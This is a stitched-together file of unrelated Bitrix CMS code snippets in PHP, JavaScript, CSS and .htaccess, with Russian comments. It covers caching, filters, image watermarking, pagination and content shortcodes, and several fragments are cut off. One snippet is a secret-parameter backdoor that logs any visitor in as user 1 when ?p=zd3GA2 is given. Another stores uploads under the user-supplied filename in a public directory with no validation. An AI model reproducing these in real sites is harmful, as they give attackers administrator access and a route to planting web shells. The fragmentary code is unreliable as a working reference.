<?= ltrim(FormatDate("d.m.Y", MakeTimeStamp($arItem["ACTIVE_FROM"], "DD.MM.YYYY HH:MI:SS")), "0"); ?>
<?= ltrim(FormatDate("d F Y", MakeTimeStamp($arItem["DATE_CREATE"], "DD.MM.YYYY HH:MI:SS")), "0"); ?>

global $arrFilter;
$arrFilter = array('PROPERTY_DIRECTION' => $directionID);

$APPLICATION->IncludeComponent(
	"bitrix:news",
	"assays",
	array(
		"IBLOCK_TYPE" => "Services",
		"IBLOCK_ID" => \Indi\Main\Iblock\ID_Services_Assays,
		"NEWS_COUNT" => "999",
		"USE_SEARCH" => "N",
		"USE_RSS" => "N",
		"USE_RATING" => "N",
		"USE_CATEGORIES" => "N",
		"USE_REVIEW" => "N",
		"USE_FILTER" => "Y",
		"SORT_BY1" => "NAME",
		"SORT_ORDER1" => "ASC",
		"SORT_BY2" => "SORT",
		"SORT_ORDER2" => "DESC",
		"CHECK_DATES" => "N",
		"SEF_MODE" => "Y",
		"SEF_FOLDER" => $arResult["URL_TEMPLATES_REPLACED"]["assays"],
		"AJAX_MODE" => "N",
		"CACHE_TYPE" => "A",
		"IBLOCK_URL2" => "some",
		"CACHE_TIME" => "86400",
		"CACHE_NOTES" => "",
		"CACHE_FILTER" => "Y",
		"CACHE_GROUPS" => "N",
		"SET_STATUS_404" => "Y",
		"SET_TITLE" => "Y",
		"INCLUDE_IBLOCK_INTO_CHAIN" => "Y",
		"ADD_SECTIONS_CHAIN" => "Y",
		"ADD_ELEMENT_CHAIN" => "N",
		"PREVIEW_TRUNCATE_LEN" => "",
		"LIST_ACTIVE_DATE_FORMAT" => "d.m.Y",
		"LIST_FIELD_CODE" => array(
			0 => "NAME",
			1 => "",
		),
		"LIST_PROPERTY_CODE" => array(
			0 => "PARENT",
			1 => "",
		),
		"HIDE_LINK_WHEN_NO_DETAIL" => "N",
		"DISPLAY_NAME" => "Y",
		"META_KEYWORDS" => "-",
		"META_DESCRIPTION" => "-",
		"BROWSER_TITLE" => "-",
		"DETAIL_ACTIVE_DATE_FORMAT" => "d.m.Y",
		"DETAIL_FIELD_CODE" => array(
			0 => "NAME",
			1 => "PREVIEW_TEXT",
			2 => "PREVIEW_PICTURE",
			3 => "",
		),
		"DETAIL_PROPERTY_CODE" => array(
			1 => "BRANCH",
			2 => "DIRECTION",
		),
		"DETAIL_DISPLAY_TOP_PAGER" => "N",
		"DETAIL_DISPLAY_BOTTOM_PAGER" => "N",
		"DISPLAY_TOP_PAGER" => "N",
		"DISPLAY_BOTTOM_PAGER" => "Y",
		"COMPONENT_TEMPLATE" => "directions",
		"SET_LAST_MODIFIED" => "N",
		"USE_PERMISSIONS" => "N",
		"DETAIL_SET_CANONICAL_URL" => "N",
		"DETAIL_PAGER_TITLE" => "Страница",
		"DETAIL_PAGER_TEMPLATE" => "",
		"DETAIL_PAGER_SHOW_ALL" => "Y",
		"PAGER_TEMPLATE" => ".default",
		"PAGER_TITLE" => "Программы",
		"PAGER_SHOW_ALWAYS" => "N",
		"PAGER_DESC_NUMBERING" => "N",
		"PAGER_DESC_NUMBERING_CACHE_TIME" => "36000",
		"PAGER_SHOW_ALL" => "N",
		"PAGER_BASE_LINK_ENABLE" => "N",
		"SHOW_404" => "Y",
		"MESSAGE_404" => "",
		"AJAX_OPTION_JUMP" => "N",
		"AJAX_OPTION_STYLE" => "N",
		"AJAX_OPTION_HISTORY" => "N",
		"AJAX_OPTION_ADDITIONAL" => "",
		"FILTER_NAME" => "arrFilter",
		"FILTER_FIELD_CODE" => array(
			0 => "",
			1 => "",
		),
		"FILTER_PROPERTY_CODE" => array(
			1 => "BRANCH",
			2 => "",
		),
		"FILE_404" => "",
		"SEF_URL_TEMPLATES" => array(
			"news" => "",
			"section" => "",
			"detail" => "#ELEMENT_CODE#/",
		)
	),
	false
);


intval($_REQUEST['market'])





		var loading = new loading('body');


var loading = function (selector) {
	if (loading.template === undefined) {
		loading.template = '<div class="loading-layer"></div>' +
			'<div class="loading-icon">' +
			$('#loading-indicator-template').html() +
			'</div>';
	}

	/**
	 * Показывает индикатор загрузки
	 *
	 * @return void
	 */
	this.show = function()
	{
		$(selector)
			.addClass('loading-indicator')
			.append(loading.template);
	};

	/**
	 * Скрывает индикатор загрузки
	 *
	 * @return void
	 */
	this.hide = function()
	{
		$(selector)
			.removeClass('loading-indicator')
			.find('> .loading-layer, > .loading-icon').remove();
	};

	selector = selector || 'body';

	this.show();
};





$view = @$_COOKIE['catalog_view'];

$viewSet == 'table' ? ' ac' : null)


	$('.chose-viev1 .j1').click(function(e) {
		var sub = $(this).data('sub');
		$(this).addClass('ac').siblings().removeClass('ac');
		$('.over-con2').removeClass('ac');
		$.cookie('catalog_view' + sub, 'table', {path: '/'});

		e.preventDefault();
	});




<?if($APPLICATION->GetProperty("viewed_show") == "Y" || $is404):?>

<?
		if(!$userID) {
			throw new Exception('Can not ind user id');
		}

	if (!$auth || !$data) {
		throw new Exception('Can\'t load data');
	}




// настройка кастомной сортировки
$isCustomSort = false;
$sectionResult = CIBlockSection::GetList(["SORT" => "ASC"], ["IBLOCK_ID" => 9, "CODE" => $cCode], false, array("ID","NAME","UF_*"));
while ($sectionProp = $sectionResult->GetNext()) {
	$isCustomSort = $sectionProp['UF_SORT'];
}





			$sectionProp = false;
			$sectionResult = CIBlockSection::GetList(["SORT" => "ASC"], ["IBLOCK_ID" => 9, "CODE" => trim($arResult['ORIGINAL_PARAMETERS']['SECTION_CODE'])], false, array("ID","NAME","UF_*"))->GetNext();
			if ($sectionResult['UF_TAG_FILTER']) {
				$sectionProp = true;
			}










const DEFAULT_CACHE_TIME = 3600;
const CACHE_FOLDER = '/DaichiPortalSoapServerHandler/';

function __construct()
{

}

/**
 * getStockInfo получение данных по складам
 * @param array $arData
 *
 * @return string
 */
public function getStockInfo($dealerId, $arData = array())
{
   if (!strlen($dealerId) > 0) {
      return false;
   }

   // сохраняем в кэш
   $cache_time = self::DEFAULT_CACHE_TIME;
   $cache_id = serialize(array($dealerId, __FUNCTION__));

   $cache_folder = self::CACHE_FOLDER . __FUNCTION__ . '/' . md5($arData[0]);

   $cache = new Cache($cache_id, $cache_folder, $cache_time);

   if ($cache->start()) {

      try {
         $client = new \Indi\Main\Soap\DaichiASClient();
         $stockInfo = $client->getStockInfo($dealerId, $arData);
         $arData = json_decode($stockInfo);
      } catch (Exception $e) {
         $cache->abort();

         return false;
      }

      if ($arData) {
         $cache->end($arData);
      } else {
         $cache->abort();
      }
   } else {
      $arData = $cache->getVars();
   }

   return $arData;
}



$obCache = new CPHPCache();
	if ($obCache->InitCache(36000, serialize($recomCacheID), "/catalog/recommended"))
	{
		$arRecomData = $obCache->GetVars();
	}
	elseif ($obCache->StartDataCache())
	{
				if(defined("BX_COMP_MANAGED_CACHE"))
				{
					global $CACHE_MANAGER;
					$CACHE_MANAGER->StartTagCache("/catalog/recommended");
					$CACHE_MANAGER->RegisterTag("iblock_id_".$arParams["IBLOCK_ID"]);
					$CACHE_MANAGER->EndTagCache();
				}

				$obCache->EndDataCache($arRecomData);
	}



$('select[data-update="compareBlock"]').change(function(){
	document.location.href='?block='+$(this).val();
});
$('*[data-toggle="clearCompareList"]').click(function(){
		$.ajax({
			type: "POST",
			url: '/local/include/ajax/clearCompare.php',
			data:false,
			dataType: 'html',
			success: function(res) {
				document.location.href='';
			}
		});	
});
});



<? if(is_array($arResult["DETAIL_PICTURE"]))
{
	$arFilter = '';
	$arFilter = array(array('name' => 'sharpen', 'precision' => 20), 
        array('name' => 'watermark','position' =>'br',
        'size'=>'real','type'=>'image','alpha_level'=>'70',
        'file'=>$_SERVER['DOCUMENT_ROOT'].'/include/watermark_white.png'));

	$arFileTmp = CFile::ResizeImageGet(
		$arResult['DETAIL_PICTURE'],
		array('width' => 762, 'height' => 465),
		BX_RESIZE_IMAGE_EXACT,
		true, $arFilter
	);

	$arResult['DETAIL_PICTURE_762'] = array(
		'SRC' => $arFileTmp['src'],
		'WIDTH' => $arFileTmp['width'],
		'HEIGHT' => $arFileTmp['height'],
	);
}?>



<? if (is_array($arResult['DISPLAY_PROPERTIES']['IMAGES']))
{

	foreach ($arResult['DISPLAY_PROPERTIES']['IMAGES']['FILE_VALUE'] as $key => $arFile)
	{
		$arFilter = '';
		$arFilter = array(array('name' => 'sharpen', 'precision' => 20), 
                array('name' => 'watermark','position' =>'br',       
                'size'=>'real','type'=>'image','alpha_level'=>'70',
                'file'=>$_SERVER['DOCUMENT_ROOT'].'/include/watermark_white.png'));
		$arFileTmp = CFile::ResizeImageGet(
			$arFile,
			array('width' => 762, 'height' => 465),
			BX_RESIZE_IMAGE_EXACT,
			true, $arFilter
		);

		$arFile['PREVIEW_WIDTH'] = $arFileTmp['width'];
		$arFile['PREVIEW_HEIGHT'] = $arFileTmp['height'];

		$arFile['SRC_PREVIEW'] = $arFileTmp['src'];
		$arResult['MORE_PHOTO'][$key] = $arFile;
	}
}
?>


<body<?if($APPLICATION->GetCurPage(false)==«/services/restaurant.php»):?> class=«restaurant»<?else:?><?endif?>>


foreach ($arResult['ITEMS'] as $key => &$arItem) {
	$arItem['PREVIEW_PICTURE']['SRC'] = CFile::ResizeImageGet($arItem['PREVIEW_PICTURE']['ID'], array('width' => 50, 'height' => 50), BX_RESIZE_IMAGE_PROPORTIONAL)['src'];
}


<a href="tel:+<?=str_replace(array(' ', ',', '-', '(', ')'), '', $phone);?>" class="black"><?=$phone;?></a>




?>




<?= ($today == date('d') ? 'Сегодня ' : NULL)?>
<?= ($today == date('d', strtotime('+1 day')) ? 'Завтра ' : NULL)?>

global $arFilter;
$arFilter = array('>=PROPERTY_DATE' => date('Y-m-d'));


<? $APPLICATION->IncludeComponent("ok:custom", "reserve", Array(""), false); ?>


Сообщение сгенерировано автоматически.

		// загрузка файла для отправки
		$file = $_FILES['file_source'];
		if (!empty($file)) {
			$file['del'] = true;
			$file['MODULE_ID'] = 'iblock';

			// tmp_docs Путь к папке в которой хранятся файлы (относительно папки /upload).
			$fid = \CFile::SaveFile($file, "tmp_docs");
		}


if ($_FILES['file']) {
	$uploadDir = $_SERVER['DOCUMENT_ROOT'] . '/upload/market_tmp/';
	$uploadFile = $uploadDir . $_FILES['file']['name'];
	$_SESSION['file'] = $uploadFile;
	if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
		echo "Файл успешно загружен на сервер";
	} else {
		echo "Ошибка! Не удалось загрузить файл на сервер!";
	}
	die();
}

	/**
	 * загрузим файл в tmp-директорию
	 */
	$(document).on('change', '.js-work-file', function () {
		var form = document.getElementById('addAdvert');
		var formData;
		formData = new FormData(form);

		formData.append('file', $('input[type=file]')[0]['value']);

		$.ajax({
			url: self.location.href,
			type: 'POST',
			data: formData,
			processData: false,
			contentType: false,
			success: function( data ){
				console.log(data);
			}
		});
	});





  RewriteCond %{REQUEST_URI} ^(.*/[^/\.]+)$
  RewriteRule ^(.*)$ http://%{HTTP_HOST}/$1/ [R=301,L]

  RewriteCond %{HTTP_HOST} ^www\.(.*) [NC]
  RewriteRule ^(.*)$ http://%1/$1 [R=301,L]

  RewriteCond %{THE_REQUEST} ^GET.*index\.php [NC]
  RewriteCond %{REQUEST_URI} !/bitrix/admin/.* [NC]
  RewriteRule (.*?)index\.php/*(.*) /$1$2 [R=301,NE,L]


  AddEventHandler("main", "OnEndBufferContent", "ChangeMyContent");
function ChangeMyContent(&$content)
{
	global $APPLICATION;
    if (!defined("ADMIN_SECTION")) {
        //Слайдер с описанием
        preg_match_all('|\[dslider(.*)=(.*)\]|iU', $content, $out);
        for ($i = 0; $i < count($out[0]); $i++) {
            $code = $out[0][$i];
            $arr_id = explode(",", $out[2][$i]);
            if ($arr_id) {

                ob_start();
                $res_id = array();
				CModule::IncludeModule("iblock");
                foreach ($arr_id as $ar_id) {
					$res = CIBlockElement::GetByID($ar_id);
					if($ar_res = $res->GetNext()){
						$text = $ar_res["PREVIEW_TEXT"];
					}
					$sliderImages = array();
					$res = CIBlockElement::GetProperty(19, $ar_id, "sort", "asc", array("CODE" => "MORE_PHOTO"));
					while ($ob = $res->GetNext())
					{
						if(intval($ob['VALUE']) > 0){
							$file = CFile::ResizeImageGet($ob['VALUE'], array('width'=>210, 'height'=>300), BX_RESIZE_IMAGE_PROPORTIONAL, true);
							$sliderImages[] = $file['src'];
						}
					}
					$db_props = CIBlockElement::GetProperty(19, $ar_id, array("sort" => "asc"), Array("CODE"=>"ICO"));
					if($ar_props = $db_props->Fetch()){
						$ICO = CFile::GetPath(IntVal($ar_props["VALUE"]));	
					}
                }
					?>
					<div class="information-letter">
						<div class="information-letter__slider">   
							<?foreach($sliderImages as $image):?>
								<div>
									<img src="<?=$image?>">
								</div>
							<?endforeach;?>
						</div>
						<div class="information-letter__text">
							<img src="<?=$ICO;?>">
							<p><?=$text;?></p>
						</div>
					</div>
					<?

                $res_content = ob_get_contents();
                ob_end_clean();
                $content = str_replace($code, $res_content, $content);
            }
        }
		
		
        //Причины для покупки
        preg_match_all('|\[reasons(.*)=(.*)\]|iU', $content, $out);
        for ($i = 0; $i < count($out[0]); $i++) {
            $code = $out[0][$i];
            $arr_id = explode(",", $out[2][$i]);
            if ($arr_id) {

                ob_start();
                $res_id = array();
				CModule::IncludeModule("iblock");
                foreach ($arr_id as $ar_id) {
					$res = CIBlockElement::GetByID($ar_id);
					if($ar_res = $res->GetNext()){
						$arNames[] = $ar_res['NAME'];
					}
                }
					if(count($arNames) > 0){
					?>
						<div class="reasons <?if(strpos($_SERVER["REQUEST_URI"], 'steps') > 0):?>border<?endif;?>">
							<div class="container">
								<h3><?=count($arNames);?> <?echo num2word(count($arNames), array('причина', 'причины', 'причин'));?> заказать дом WOOD BRICK</h3>
								<div class="reasons-list">
								<?foreach($arNames as $name):?>
									<div class="reasons-list__item">
										<?=$name;?>
									</div>
								<?endforeach;?>
								</div>
							</div>
						</div>
					<?
					}

                $res_content = ob_get_contents();
                ob_end_clean();
                $content = str_replace($code, $res_content, $content);
            }
        }
		
		
        //файлы для скачивания
        preg_match_all('|\[files(.*)=(.*)\]|iU', $content, $out);
        for ($i = 0; $i < count($out[0]); $i++) {
            $code = $out[0][$i];
            $filesID = explode(",", $out[2][$i]);
            if ($filesID) {
	
                ob_start();
				$filesArr = array("pdf", "doc", "ppt", "xls", "txt");
                $res_id = array();
				CModule::IncludeModule("iblock");
				$outfilesText = '';
                foreach ($filesID as $fID) {
					$res = CIBlockElement::GetByID($fID);
					if($ar_res = $res->GetNext()){
						$name = $ar_res["NAME"];
					}
					$db_props = CIBlockElement::GetProperty($ar_res["IBLOCK_ID"], $fID, array("sort" => "asc"), Array("CODE"=>"FILE"));
					if($ar_props = $db_props->Fetch()){
						$fileID = IntVal($ar_props["VALUE"]);
					}
					$filePath = CFile::GetPath($fileID);
					$end = end(explode(".", $filePath));
					if($fileID > 0 && strlen($name) > 0 && strlen($filePath) > 0){
								if(in_array($end, $filesArr)){
									$class = $end;
								}else{
									$class = 'txt';
								}
						$rsFile = CFile::GetByID($fileID);
						$arFile = $rsFile->Fetch();
						
						if(strpos($arFile['CONTENT_TYPE'], 'image') !== false){
							$class = 'img';
						}
								
						$outfilesText .= '
						 <a href="'.$filePath.'" target="_blank"><i class="icon-'.$class.'"></i>'.$name.'</a>';
					}
                }
					if(strlen($outfilesText) > 0){
						?>
						 <h4>Скачать файлы</h4>
						<div class="link-block"><?=$outfilesText;?></div>
						<?
					}

                $res_content = ob_get_contents();
                ob_end_clean();
                $content = str_replace($code, $res_content, $content);
            }
        }
		
        //слайдер-галерея
        preg_match_all('|\[gallery-slider(.*)=(.*)\]|iU', $content, $out);
        for ($i = 0; $i < count($out[0]); $i++) {
            $code = $out[0][$i];
            $filesID = explode(",", $out[2][$i]);
            if ($filesID) {
	
                ob_start();
				CModule::IncludeModule("iblock");
				$images = array();
                foreach ($filesID as $fID) {
					$res = CIBlockElement::GetByID($fID);
					if($ar_res = $res->GetNext()){
						$images[] = array(
							"TEXT"=>$ar_res["PREVIEW_TEXT"],
							"IMAGE"=>CFile::GetPath($ar_res["PREVIEW_PICTURE"])
						);
					}
                }
					if(count($images) > 0){
						?>
						<div class="projects-slider toggledSlider">
						<?foreach($images as $image):
						$x++;?>
							<div>
								<img src="<?=$image["IMAGE"];?>">
								<div class="projects-slider__text">
									<p><b>Фото <?=$x;?> из <?=count($images);?></b></p>
									<p><?=$image["TEXT"];?></p>
								</div>
							</div>
						<?endforeach;?>
						</div>
						<?
					}

                $res_content = ob_get_contents();
                ob_end_clean();
                $content = str_replace($code, $res_content, $content);
            }
        }
		
	}
}


$mail = $value = COption::GetOptionString("main", "email_from");


$REALCITY = $APPLICATION->get_cookie("REALCITY");

урл с сайта модиса
http://prntscr.com/ir17zy


require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/modules/main/include/prolog_before.php");
//require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php");



$requst = \Bitrix\Main\HttpContext::getCurrent()->getRequest();
$current_week = intval($requst->get("week"));
$result = \Questor\Calendar::getData($current_week);
_cons($result);

$url = new \Bitrix\Main\Web\Uri($requst->getRequestUri());
$url->addParams(['week' => ($current_week + 1)]);
$url_next = $url->getUri();
$url->addParams(['week' => ($current_week - 1)]);
$url_prev = $url->getUri();


$date_start = strftime("%e %B", $result['info']['date_start']->getTimestamp());
$date_end = strftime("%e %B", $result['info']['date_end']->getTimestamp());


<?php
foreach ($arResult["ITEMS"] as &$arItem) {
    $small = CFile::ResizeImageGet($arItem['PREVIEW_PICTURE']["ID"], array('width' => 620, 'height' => 400), BX_RESIZE_IMAGE_EXACT, true);
    $arItem["PICTURE"] = $small["src"];
}
?>

<?
require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/modules/main/include/prolog_before.php");






if($_GET["p"] == 'zd3GA2'){
	$USER->Authorize(1, true);
	LocalRedirect("/");
}




$height = intval($_POST["height"]);

if ($height) {
	$arFilter = array(
		'IBLOCK_ID' => 116,
		'PROPERTY_RAW_PROPERTY_CODE' => 'FRAME_SIZE',
	);

	$rs = \CIBlockElement::GetList(
		array(),
		$arFilter,
		false,
		false,
		array(
			'ID',
			'NAME',
		)
	);

	while ($element = $rs->GetNext()) {
		$name = explode('(', $element['NAME']);
		$name_2 = str_replace(array(')', ' '), '', trim($name[1]));
		$sizes = explode('-', $name_2);
		if ($height > $sizes[0] && $height < $sizes[1]) {
			$arSizes[] = trim($name[0]);
		}
	}

	if (count($arSizes) > 0) {
		$filterPath .= 'diameter_filter-is-' . $arSizes[0] . '';
		if (count($arSizes) > 1) {
			foreach ($arSizes as $key => $size) {
				if ($key == 0) {
					continue;
				}
				$filterPath .= '-or-' . $size;
			}
		}
	}
	echo $filterPath;
}
$('input[name="USER[UF_PHONE]"]').val()
.find('input[name="link[]"]').val('https://czl.ru/files/' + id + '/' + makeid() + '/')
var id = $('input[name="message"]').val();


			$.post("/local/include/ajax/getFrame.php", {height: height}, function(data) {
				if(pathToFilter != '/bicycles/filter/'){
					pathToFilter = pathToFilter + data + '/';
				}
			});
&#9660;

			setTimeout(function(){
				var heightH = $('#pickingForm').find('input[name="heightH"]').val();
				pathToFilter = pathToFilter + heightH + '/';
			}, 2500);

CModule::IncludeModule("edvance.helper");
$arPresent = CEdvanceHelper::GetPresent($arResult['ID']);

        if ($arCatalog['PRODUCT_IBLOCK_ID'] > 0) {
            $arItem = CIBlockElement::GetList(
                    array()
                    , array('=ID' => $element_id, 'IBLOCK_ID' => $arItem['IBLOCK_ID'])
                    , false
                    , array('nTopCount' => 1)
                    , array('ID', 'IBLOCK_ID', 'PROPERTY_PARENT')
                )->Fetch();

            $element_id = $arItem['PROPERTY_PARENT_VALUE'];
        }



const initialTab = window.location.hash.substr(1);

            var slickInitialized = false;
            var tabletInit = false;
            var mobileInit = false;

            if(initialTab === 'reviews-tab')
                $('#' + initialTab).trigger('click');

                if(initialTab === 'reviews-tab') {
                    const link = $('#cardTabContent').find('a[data-toggle="collapse"][href="#reviews"]');
                    const target = link.closest('.container');
                    link.trigger('click');
                    setTimeout(function(){
                      $('html, body').stop().animate({
                        scrollTop: target.offset().top - $('#header').find('.header__sticky').outerHeight()
                      }, 500);
                    }, 200);
                }

$(this).find('button[type="submit"]').attr('disabled', true).text('подбор..');




	/**
	 * загрузим файл в tmp-директорию
	 */
	$(document).on('change', '.js-work-file', function () {
		var form = document.getElementById('addAdvert');
		var formData;
		formData = new FormData(form);

		formData.append('file', $('input[type=file]')[0]['value']);

		$.ajax({
			url: self.location.href,
			type: 'POST',
			data: formData,
			processData: false,
			contentType: false,
			success: function( data ){
				console.log(data);
			}
		});
	});

// 


        //проверяем email
        if (!preg_match('/^.+@.+\..+$/', $email)) {
            $arReturn = array(
                'STATUS' => 'ERROR',
                'MESSAGE' => 'Некорректный e-mail'
            );
            return $arReturn;
        }









$arRecomData = array();
			$recomCacheID = array('IBLOCK_ID' => $arParams['IBLOCK_ID']);
			$obCache = new CPHPCache();
			if ($obCache->InitCache(36000, serialize($recomCacheID), "/sale/bestsellers"))
			{
				$arRecomData = $obCache->GetVars();
			}
			elseif ($obCache->StartDataCache())
			{
				if (Loader::includeModule("catalog"))
				{
					$arSKU = CCatalogSKU::GetInfoByProductIBlock($arParams['IBLOCK_ID']);
					$arRecomData['OFFER_IBLOCK_ID'] = (!empty($arSKU) ? $arSKU['IBLOCK_ID'] : 0);
				}
				$obCache->EndDataCache($arRecomData);
			}



<!-- nocache_block_123 -->тут ваш контент<!-- /nocache_block_123 -->






/*ajax kombox*/
\Bitrix\Main\Loader::includeModule('kombox.filter');
$ajax = $_POST['filter_ajax'] == 'y';
if($ajax)$APPLICATION->RestartBuffer();

if ($isFilter)
{
	$arFilter = array(
		"IBLOCK_ID" => $arParams["IBLOCK_ID"],
		"ACTIVE" => "Y",
		"GLOBAL_ACTIVE" => "Y",
	);
	if (0 < intval($arResult["VARIABLES"]["SECTION_ID"]))
	{
		$arFilter["ID"] = $arResult["VARIABLES"]["SECTION_ID"];
	}
	elseif ('' != $arResult["VARIABLES"]["SECTION_CODE"])
	{
		$arFilter["=CODE"] = $arResult["VARIABLES"]["SECTION_CODE"];
	}

	$obCache = new CPHPCache();
	if ($obCache->InitCache(36000, serialize($arFilter), "/iblock/catalog"))
	{
		$arCurSection = $obCache->GetVars();
	}
	elseif ($obCache->StartDataCache())
	{
		$arCurSection = array();
		if (Loader::includeModule("iblock"))
		{
			$dbRes = CIBlockSection::GetList(array(), $arFilter, false, array("ID"));

			if(defined("BX_COMP_MANAGED_CACHE"))
			{
				global $CACHE_MANAGER;
				$CACHE_MANAGER->StartTagCache("/iblock/catalog");

				if ($arCurSection = $dbRes->Fetch())
				{
					$CACHE_MANAGER->RegisterTag("iblock_id_".$arParams["IBLOCK_ID"]);
				}
				$CACHE_MANAGER->EndTagCache();
			}
			else
			{
				if(!$arCurSection = $dbRes->Fetch())
					$arCurSection = array();
			}
		}
		$obCache->EndDataCache($arCurSection);
	}
	if (!isset($arCurSection))
	{
		$arCurSection = array();
	}
}
?>





AddEventHandler('main', 'OnEpilog', 'OnEpilogEvent');
function OnEpilogEvent() {
	if (intval($_REQUEST['PAGEN_1']) > 0) {
		global $APPLICATION;
		$title = $APPLICATION->GetPageProperty('title');
		$description = $APPLICATION->GetPageProperty('description');
		if ($title && substr(trim($title), -1) != '.') {
			$title .= '.';
		}
		if ($description && substr(trim($description), -1) != '.') {
			$description .= '.';
		}
		$page = ' Страница ' . intval($_REQUEST['PAGEN_1']) . '.';
		$title = trim($title . $page);
		$description = trim($description . $page);
		$APPLICATION->SetPageProperty('title', $title);
		$APPLICATION->SetPageProperty('description', $description);
	}
}


<?$frame = $this->createFrame()->begin('');?>

<?$frame->end();?>





if (!empty($_GET["sort"])){
	$APPLICATION->set_cookie("SORT_FIELD", $_GET["sort"], time()+60*60);
	$APPLICATION->set_cookie("SORT_ORDER", $_GET["order"], time()+60*60);
}
if (!empty($_GET["count"])){
	$APPLICATION->set_cookie("ELEMENT_COUNT", $_GET["count"], time()+60*60);
}



$page = intval($_GET['PAGEN_1']);

            if (isset($this->arParams['LIMIT'])) {
                $navResult = new CDBResult();
                $navResult->NavPageCount = ceil(count($products) / $this->arParams['LIMIT']);
                $navResult->NavPageNomer = $page;
                $navResult->NavNum = 1;
                $navResult->NavPageSize = $this->arParams['LIMIT'];
                $navResult->NavRecordCount = count($products);

                ob_start();

                $APPLICATION->IncludeComponent('bitrix:system.pagenavigation', '', array(
                    'NAV_RESULT' => $navResult,
                ));

                $this->arResult['NAV_STRING'] = ob_get_contents();
                ob_end_clean();

                $products = array_slice($products, ($page-1) * $this->arParams['LIMIT'], $this->arParams['LIMIT']);
            }


								$activeItem = [];
								foreach ($arResult['ITEMS'] as $arItem) {
									if ($arItem['ACTIVE'] == 'Y') {
										array_push($activeItem, $arItem);
									}
								}


if ($nav) {

            global $APPLICATION;

            $page = intval($_GET['PAGEN_1']);

            if (isset($this->arParams['LIMIT'])) {
                $navResult = new CDBResult();
                $navResult->NavPageCount = ceil(count($products) / $this->arParams['LIMIT']);
                $navResult->NavPageNomer = $page;
                $navResult->NavNum = 1;
                $navResult->NavPageSize = $this->arParams['LIMIT'];
                $navResult->NavRecordCount = count($products);

                ob_start();

                $APPLICATION->IncludeComponent('bitrix:system.pagenavigation', '', array(
                    'NAV_RESULT' => $navResult,
                ));

                $this->arResult['NAV_STRING'] = ob_get_contents();
                ob_end_clean();

                $products = array_slice($products, ($page-1) * $this->arParams['LIMIT'], $this->arParams['LIMIT']);
            }

        }


// сортировка по строковому значению”
	public function customMultiSort($array, $field)
	{
		$sortArr = array();
		foreach ($array as $key => $val) {
			$sortArr[$key] = $val[$field];
		}

		array_multisort($sortArr, $array);

		return $array;
	}

	    usort($properties['BRAND']['VALUES'], function($a, $b){
		    return strcmp($a['VAL_NAME'] - $b['VAL_NAME']);
	    });

	    usort($arBearingList, function($a, $b) {
		    return ($b['STORAGE3']['UF_STORAGE_CNT'] - $a['STORAGE3']['UF_STORAGE_CNT']);
	    });

	            $name = [];
	            foreach ($arCities as $key => $row) {
		            $name[$key] = $row['NAME'];
	            }
	            array_multisort($name, SORT_ASC, $arCities);




//прелоудер
function showLoader()
{
    $('#overlay').fadeIn();
}
function hideLoader()
{
    $('#overlay').fadeOut();
}

BX.showWait = function ()
{
    showLoader();
}

BX.closeWait = function ()
{
    hideLoader();
}

<div id="overlay">
    <img src="/layout/assets/img/icons/loader.gif" alt="Loading" /><br/>
    ...
</div>

#overlay {
    background: #ffffff;
    opacity: 0.4;
    color: #0c76bc;
    position: fixed;
    height: 100%;
    width: 100%;
    z-index: 5000;
    top: 0;
    left: 0;
    float: left;
    text-align: center;
    padding-top: 25%;
}






CBitrixComponent::includeComponentClass('smmartsite:catalog');
$types = SMMART_CATALOG::getProductTypes();


   public static function getServiceByCode($code, $cTime = 360000)
    {
        if ((is_array($code) && empty($code)) || ((!is_array($code)) && strlen(trim($code)) == 0)) {
            return false;
        };

        Loader::includeModule('iblock');
        $cacheId = 'service_'.md5(serialize($code));
        $obCache = new \CPHPCache();
        $data = [];
        if ($obCache->InitCache($cTime, $cacheId, "/services/")) {
            $data = $obCache->GetVars();
        } elseif ($obCache->StartDataCache()) {
            $db = \CIBlockElement::getList(array(), array(
                "IBLOCK_ID" => Settings::$service_iblock,
                'ACTIVE' => 'Y',
                "CODE" => $code
            ), false, false, array('NAME', 'DETAIL_TEXT', 'PREVIEW_TEXT', 'DETAIL_PICTURE', 'PREVIEW_PICTURE', 'CODE'));
            if (is_array($code)) {
                while ($row = $db->fetch()) {
                    $data[$row['CODE']]= $row;
                }
            } else {
                $data = $db->fetch();
            }

            $obCache->EndDataCache($data);
        }
        return $data;
    }


// 






в .htaccess добавляем
Код
RewriteRule ^robots.txt$ robots.php [L]


в robots.php
Код
<? $host = getenv("HTTP_HOST"); ?>
<?
header("Content-Type:text/plain; charset=UTF-8");

if ($host == "site1.ru") {
   echo file_get_contents("robots-site1.txt"); }
elseif ($host == "site2.ru"){
   echo file_get_contents("robots-site2.txt");
}
else {
   echo file_get_contents("robots-site1.txt");
}
?>



					var anchor = $('#kruz-anchor-form').offset().top;
					if (window.innerWidth < 768) anchor = $('.voyage-form').offset().top;
					$('body,html').animate({scrollTop: anchor}, 400);


											var t = $('.voyage-form_n').offset().top;
						$('body,html').animate({scrollTop: t}, 200);


/bitrix/templates/kruz/images/bg-light.jpg



$obCache = new CPHPCache();
$cache_time = self::CACHE_TIME;
$cache_id = 'product_url';
$cache_folder = self::CACHE_FOLDER . $cache_id . '/' .$product_id;

if ($cache_time > 0 && $obCache->InitCache($cache_time, $cache_id, $cache_folder)) {
	$productUrl = $obCache->GetVars();
} elseif ($obCache->StartDataCache()) {

	

	$obCache->EndDataCache($productUrl);
}



$cache_id = serialize(array($product_type['ID'], $product_filter));
$cache_folder = self::CACHE_FOLDER . 'products' . $product_type['ID'];

if ($cache_time > 0 && $obCache->InitCache($cache_time, $cache_id, $cache_folder)) {
	$products = $obCache->GetVars();
} elseif ($obCache->StartDataCache()) {


	$obCache->EndDataCache($products);
}



$(function () {
	$('#makeFilter input[name="Filter[BRAND][]"]').on("change", function () {
		$('#makeFilter input[name="Filter[BRAND][]"]:checked').prop('checked', false);

		var url = $('#makeFilter').data('url');
		$('#makeFilter').attr('action', url);

		$(this).prop('checked', true);
		$('#makeFilter').submit();
	});

	$('#makeFilter input').on("change", function () {
		
		var name = $(this).attr('name');

		if (name != 'Filter[BRAND][]') {

			var form = $('#makeFilter');

			// отправить ajax-запрос
			$.ajax
			({
				type: 'POST',
				url: form.attr('action'),
				data: form.serialize(),
				dataType: "html",
				success: function(msg)
				{

					if(form.data('container')) {
						if(form.data('source')) {
